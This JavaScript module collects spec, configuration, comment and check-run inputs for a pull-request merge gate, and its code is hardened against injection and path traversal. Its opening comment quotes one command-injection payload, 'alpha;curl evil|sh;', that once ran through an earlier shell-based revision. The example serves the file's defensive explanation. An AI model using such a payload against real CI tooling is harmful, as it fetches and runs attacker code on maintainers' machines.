/**
 * Gathers the §5 criteria inputs that `checkMergeGate` judges.
 *
 * `pr-gates.mjs` is deliberately free of I/O — it only decides — so every fact
 * the criteria rules need is collected here and handed in. Dependencies arrive
 * through a `deps` object exposing `run`, the same injection shape
 * `criteria/preconditions.mjs` uses, so the whole gather can be exercised
 * without a repository, a network, or a `gh` token.
 *
 * `run` takes an ARGV ARRAY and must not use a shell. Every value below is
 * attacker-reachable: the Spec IDs come straight out of the pull-request body.
 * An earlier revision built shell strings here, and a body whose `## Spec ID`
 * section read `alpha;curl evil|sh;` executed on the machine of whoever ran
 * the merge gate. Argv arrays remove the class; SPEC_ID_RE below removes the
 * path traversal that quoting alone would have left behind.
 *
 * The ref split is the security property (KD-14, REL-16). The criteria
 * CONFIGURATION comes from the base ref, so a pull request cannot relax the
 * gate that judges it by editing `.dotbabel.json` in its own branch. Specs are
 * read at BOTH refs for different questions: the head says what must be proven
 * now, and the base says what was active before, so dropping a criterion is
 * visible as weakening rather than as an absence. Evidence and the check run
 * come from the head.
 */
import { parseSpecIds, stripFences } from "../lib/spec-ids.mjs";
import { anyPathMatches } from "../spec-harness-lib.mjs";
import { loadCriteriaConfigText } from "./config.mjs";

/** The check-run name KD-10 gives the criteria job in the CI templates. */
export const CRITERIA_CHECK_NAME = "dotbabel criteria";

/** Page size and cap for the comment fetch: 100 pages is 10,000 comments. */
const COMMENT_PAGE_SIZE = 100;
const MAX_COMMENT_PAGES = 100;

// The section runs from its own heading to the next H2 or the end of the body.
const RE_CRITERIA_RATIONALE = /^ {0,3}##[ \t]+Criteria change rationale[ \t]*$([\s\S]*?)(?=^ {0,3}##[ \t]|$(?![\s\S]))/im;

const COMMENTS_QUERY = [
  "query($owner:String!,$repo:String!,$number:Int!,$cursor:String){",
  "repository(owner:$owner,name:$repo){",
  `pullRequest(number:$number){comments(first:${COMMENT_PAGE_SIZE},after:$cursor){`,
  "pageInfo{hasNextPage endCursor}",
  "nodes{body authorAssociation lastEditedAt author{login}}",
  "}}}}",
].join("");

/**
 * @typedef {{run: (argv: string[]) => {status: number, stdout: string, stderr: string}}} GateDeps
 */

/**
 * A Spec ID that is safe to use as a path segment: a plain directory name.
 *
 * Spec IDs come from the pull-request body, which anyone who can open a pull
 * request controls, and `parseSpecIdSection` deliberately does not sanitize
 * them — containment is the caller's job. This is that job. Rejecting here
 * also closes the `../../` traversal the same token permits.
 */
const SPEC_ID_RE = /^[A-Za-z0-9][A-Za-z0-9._-]*$/;

/** A full commit object id, the only shape `gh` ever returns for a ref oid. */
const SHA_RE = /^[0-9a-f]{40}$/i;

/**
 * Build the criteria half of the merge-gate input.
 *
 * Returns `{}` — not a set of empty criteria fields — when the pull request
 * has no ref information or declares no Spec ID. That distinction matters:
 * `{}` leaves `checkMergeGate` on exactly its pre-criteria behaviour, so a
 * repository that never adopted criteria sees no change at all.
 *
 * @param {GateDeps} deps
 * @param {{body?: string, headRefOid?: string, baseRefOid?: string}} view `gh pr view` JSON.
 * @param {number} prNumber
 * @returns {object}
 */
export function criteriaGateInputs(deps, view, prNumber) {
  const headSha = String(view?.headRefOid ?? "");
  const baseSha = String(view?.baseRefOid ?? "");
  // Shape-check rather than merely non-empty: these reach argv positions, and
  // a value that is not a commit id is a caller bug, not a pull request the
  // gate should try to judge.
  if (!SHA_RE.test(headSha) || !SHA_RE.test(baseSha)) return {};

  const body = String(view?.body ?? "");
  const declaredIds = parseSpecIds(body);
  const changedPaths = (view?.files ?? []).map((f) => String(f?.path ?? "")).filter(Boolean);
  // Nothing declared and nothing changed means nothing can be in scope, whatever
  // the base ref says — so exit before paying for any git call at all.
  if (declaredIds.length === 0 && changedPaths.length === 0) return {};

  // Every base-ref read below answers "not there" the same way it answers
  // "could not read", and the two must not be confused. A base commit this
  // clone never fetched — a shallow CI checkout, a stale worktree — would
  // otherwise quietly empty baseActiveCriteria (so removing a criterion stops
  // reading as weakening) and drop the configuration back to defaults (so a
  // repository's require_ci_check: true becomes false). Both are fail-open,
  // which REL-3 forbids. Probe once and refuse instead.
  if (!refIsReadable(deps, baseSha)) {
    return {
      headRefOid: headSha,
      requiredCriteria: {},
      baseActiveCriteria: {},
      unknownSpecIds: [],
      criteriaChangeRationale: false,
      criteriaBaseUnreadable: baseSha,
      comments: [],
      ciCriteriaCheck: null,
    };
  }

  // REL-19: scope is the union of what the body declares and what the diff
  // implicates. Path matching is read at the BASE ref, so a pull request can
  // neither exclude itself by editing `linked_paths` nor escape the gate by
  // declaring a criteria-free spec — or no Spec ID at all.
  const implicatedIds = implicatedSpecIds(deps, baseSha, changedPaths);
  const scopedIds = [...new Set([...declaredIds, ...implicatedIds])];
  if (scopedIds.length === 0) return {};

  const declared = new Set(declaredIds);

  /** @type {Record<string, string[]>} */
  const requiredCriteria = {};
  /** @type {Record<string, string[]>} */
  const baseActiveCriteria = {};
  const unknownSpecIds = [];

  for (const id of scopedIds) {
    // Never let an unvalidated id reach a command. An id that is not a plain
    // directory name names no spec, so it belongs in unknownSpecIds — which
    // blocks the merge — rather than in a `git show` argument.
    if (!SPEC_ID_RE.test(id)) {
      unknownSpecIds.push(id);
      continue;
    }

    const head = activeCriteriaAt(deps, headSha, id);
    // `unknownSpecIds` means the BODY named a spec that does not exist. A spec
    // reached through path matching was never named, so its absence at the
    // head is weakening (caught via baseActiveCriteria), not a body error.
    if (head === null) {
      if (declared.has(id)) unknownSpecIds.push(id);
    } else {
      requiredCriteria[id] = head;
    }

    const base = activeCriteriaAt(deps, baseSha, id);
    if (base !== null) baseActiveCriteria[id] = base;
  }

  const config = criteriaConfigAt(deps, baseSha);
  return {
    headRefOid: headSha,
    requiredCriteria,
    baseActiveCriteria,
    unknownSpecIds,
    criteriaChangeRationale: hasCriteriaChangeRationale(body),
    criteriaEnforcement: config.enforcement,
    trustedAssociations: config.trusted_associations,
    requireCiCheck: config.require_ci_check,
    comments: prComments(deps, prNumber),
    ciCriteriaCheck: config.require_ci_check ? criteriaCheckConclusion(deps, headSha) : null,
  };
}

/**
 * True when a commit object is present in this clone.
 *
 * `git cat-file -e <sha>^{commit}` is the cheap existence probe: it resolves
 * the object and exits non-zero when it is absent, without materialising a
 * tree.
 *
 * @param {GateDeps} deps
 * @param {string} sha
 * @returns {boolean}
 */
function refIsReadable(deps, sha) {
  return deps.run(["git", "cat-file", "-e", `${sha}^{commit}`]).status === 0;
}

/**
 * True when the body carries a `## Criteria change rationale` section WITH
 * CONTENT, as §5 specifies.
 *
 * Two details carry weight, because this flag downgrades `CRITERIA_WEAKENED`
 * from a blocker to a warning (REL-15) and the author writes it themselves.
 * Fences are stripped first, so a heading quoted in a documentation snippet
 * does not arm the downgrade, matching every other H2 rule in the gate. And
 * the section must actually say something — a bare heading is not a reviewed
 * decision, it is two words of self-service text.
 *
 * @param {string} body
 * @returns {boolean}
 */
function hasCriteriaChangeRationale(body) {
  const m = RE_CRITERIA_RATIONALE.exec(stripFences(body));
  return m !== null && m[1].replace(/<!--[\s\S]*?-->/g, "").trim() !== "";
}

/**
 * Spec ids whose `linked_paths` at the BASE ref match a changed file (REL-19).
 *
 * The base ref is the security property. Reading `linked_paths` at the head
 * would let a pull request delete the entry covering the files it touches and
 * so remove itself from the spec that governs them — the same reason the
 * criteria configuration is read at the base.
 *
 * A spec that does not parse at the base contributes nothing. That is the
 * permissive direction, but the alternative is worse: an unparseable spec on
 * the TRUNK would block every pull request in the repository until someone
 * fixed it, and the base ref is already-reviewed code rather than the change
 * under judgement.
 *
 * @param {GateDeps} deps
 * @param {string} baseSha
 * @param {string[]} changedPaths
 * @returns {string[]}
 */
function implicatedSpecIds(deps, baseSha, changedPaths) {
  if (changedPaths.length === 0) return [];

  const listing = deps.run(["git", "ls-tree", "-r", "--name-only", baseSha, "--", "docs/specs/"]);
  if (listing.status !== 0) return [];

  const ids = [];
  for (const line of listing.stdout.split("\n")) {
    const m = /^docs\/specs\/([^/]+)\/spec\.json$/.exec(line.trim());
    if (m === null || !SPEC_ID_RE.test(m[1])) continue;
    ids.push(m[1]);
  }

  const matched = [];
  for (const id of ids) {
    const r = deps.run(["git", "show", `${baseSha}:docs/specs/${id}/spec.json`]);
    if (r.status !== 0) continue;
    let linked;
    try {
      linked = JSON.parse(r.stdout).linked_paths;
    } catch {
      continue;
    }
    if (!Array.isArray(linked)) continue;
    if (linked.some((pattern) => typeof pattern === "string" && anyPathMatches(pattern, changedPaths))) {
      matched.push(id);
    }
  }
  return matched;
}

/**
 * The active criterion ids a spec declares at one ref, or null when the spec
 * does not exist or does not parse there.
 *
 * `null` and `[]` are different answers: an unknown spec is a body error that
 * blocks (REL-16), while an empty one simply has nothing to prove.
 *
 * @param {GateDeps} deps
 * @param {string} sha
 * @param {string} specId
 * @returns {string[]|null}
 */
function activeCriteriaAt(deps, sha, specId) {
  const r = deps.run(["git", "show", `${sha}:docs/specs/${specId}/spec.json`]);
  if (r.status !== 0) return null;
  try {
    const spec = JSON.parse(r.stdout);
    return (spec.acceptance_criteria ?? [])
      .filter((c) => c && (c.status ?? "active") !== "planned")
      .map((c) => c.id);
  } catch {
    // Unparseable at this ref: treat as absent rather than throwing. At the
    // head that lands the id in unknownSpecIds and the gate blocks; at the
    // base it means nothing can be proven weakened, which is the safe read.
    return null;
  }
}

/**
 * The `criteria` key of `.dotbabel.json` at one ref, with defaults.
 *
 * @param {GateDeps} deps
 * @param {string} sha
 * @returns {ReturnType<typeof loadCriteriaConfigText>}
 */
function criteriaConfigAt(deps, sha) {
  const r = deps.run(["git", "show", `${sha}:.dotbabel.json`]);
  return loadCriteriaConfigText(r.status === 0 ? r.stdout : null, `${sha}:.dotbabel.json`);
}

/**
 * Every issue comment on the pull request, with the fields the gate needs.
 *
 * GraphQL rather than `gh pr view --json comments` because only GraphQL
 * exposes `lastEditedAt`, and an edited comment is one the gate must refuse —
 * the text it would read is not the text the tool wrote.
 *
 * Returns null, never a partial list, when any page fails. REL-3 makes the
 * gate fail closed on that null; an empty array would read as "no evidence
 * comment exists", which is a different and much weaker claim.
 *
 * @param {GateDeps} deps
 * @param {number} prNumber
 * @returns {Array<{body: string, authorAssociation: string, authorLogin: string|null, lastEditedAt: string|null}>|null}
 */
function prComments(deps, prNumber) {
  const out = [];
  let cursor = null;

  for (let page = 0; page < MAX_COMMENT_PAGES; page += 1) {
    // `-F` for owner/repo because only that flag expands the {owner}/{repo}
    // placeholders; `-f` for the cursor so an all-digit cursor is not coerced
    // into a number. As argv entries no shell sees these, so the query keeps
    // its `$owner`/`$cursor` sigils without any quoting.
    const argv = ["gh", "api", "graphql", "-F", "owner={owner}", "-F", "repo={repo}", "-F", `number=${prNumber}`];
    if (cursor !== null) argv.push("-f", `cursor=${cursor}`);
    argv.push("-f", `query=${COMMENTS_QUERY}`);
    const r = deps.run(argv);
    if (r.status !== 0) return null;

    let data;
    try {
      data = JSON.parse(r.stdout);
    } catch {
      return null;
    }
    // A GraphQL error can arrive as HTTP 200 with an `errors` array, so a
    // status check alone would accept a response carrying no comments at all.
    if (Array.isArray(data?.errors) && data.errors.length > 0) return null;

    const conn = data?.data?.repository?.pullRequest?.comments;
    if (!conn) return null;
    for (const n of conn.nodes ?? []) {
      out.push({
        body: String(n.body ?? ""),
        authorAssociation: String(n.authorAssociation ?? ""),
        authorLogin: n.author?.login ?? null,
        lastEditedAt: n.lastEditedAt ?? null,
      });
    }
    if (!conn.pageInfo?.hasNextPage) return out;
    cursor = conn.pageInfo.endCursor;
  }

  // The cap was reached with pages still outstanding. Returning `out` would
  // hand the gate a truncated list that looks complete, and the evidence
  // comment could be in the part never fetched.
  return null;
}

/**
 * The conclusion of the `dotbabel criteria` check run on the head SHA, or null
 * when no such check exists.
 *
 * @param {GateDeps} deps
 * @param {string} headSha
 * @returns {string|null}
 */
function criteriaCheckConclusion(deps, headSha) {
  // No `--paginate`: this endpoint returns an object, and gh concatenates one
  // JSON object per page, which JSON.parse rejects — the whole lookup would
  // then always answer null. `per_page=100` covers any realistic check matrix.
  const r = deps.run(["gh", "api", `repos/{owner}/{repo}/commits/${headSha}/check-runs?per_page=100`]);
  if (r.status !== 0) return null;
  try {
    const runs = JSON.parse(r.stdout).check_runs ?? [];
    // Last wins: a re-run appends a newer run with the same name.
    const match = runs.filter((run) => run?.name === CRITERIA_CHECK_NAME).pop();
    return match ? (match.conclusion ?? null) : null;
  } catch {
    return null;
  }
}
